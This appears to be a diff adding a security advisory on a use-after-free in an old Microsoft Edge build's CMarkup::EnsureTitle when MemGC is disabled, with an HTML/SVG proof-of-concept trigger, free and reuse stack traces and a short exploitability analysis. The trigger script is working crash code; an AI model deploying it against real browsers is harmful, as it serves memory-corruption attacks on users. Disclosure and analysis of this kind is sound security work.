@@ -1,0 +1,47 @@
+1295w - Microsoft Edge CMarkup::EnsureTitle use-after-free
+=====================================
+
+Synopsis
+--------
+Specially crafted HTML can trigger a use-after-free in Microsoft Edge if MemGC
+is disabled.
+
+Known affected software and attack vectors
+------------------------------------------
++ Microsoft Edge 20.10240.16384.0
+  An attacker would need to get a target user to open a specially crafted
+  webpage. JavaScript appears to be required to trigger the issue.
+
+Repro
+-----
+    <svg xmlns="http://www.w3.org/2000/svg"><script>
+      document.addEventListener("DOMNodeInserted", function(){
+        document.adoptNode(document.documentElement);
+      }, false)
+      document.title = "";
+    </script>
+
+Description
+-----------
+Free stack:
+EDGEHTML!MemoryProtection::HeapFree+0x2a65e8
+EDGEHTML!Tree::TreeWriter::NotifyElementEnterTree+0x34b
+EDGEHTML!Tree::TreeWriter::Notify_ElementAfterEnterTree+0x6f
+EDGEHTML!CMarkup::EnsureTitle+0x25d366
+EDGEHTML!CDocument::put_title+0x2c
+EDGEHTML!CFastDOM::CDocument::Trampoline_Set_title+0x79
+
+Reuse stack:
+EDGEHTML!CMarkup::EnsureTitle+0x65
+EDGEHTML!CDocument::put_title+0x2c
+EDGEHTML!CFastDOM::CDocument::Trampoline_Set_title+0x79
+
+
+Exploit
+-------
+From the free & reuse stack, it appears that CMarkup::EnsureTitle calls
+Tree::TreeWriter::Notify_ElementAfterEnterTree, which frees the memory and
+returns. Then CMarkup::EnsureTitle reuses the memory. This may indicate that
+the free happens in the event handler, and that an attacker can modify the
+contents of the memory between free and reuse.  Either way, no one runs Edge
+with MemGC disabled.
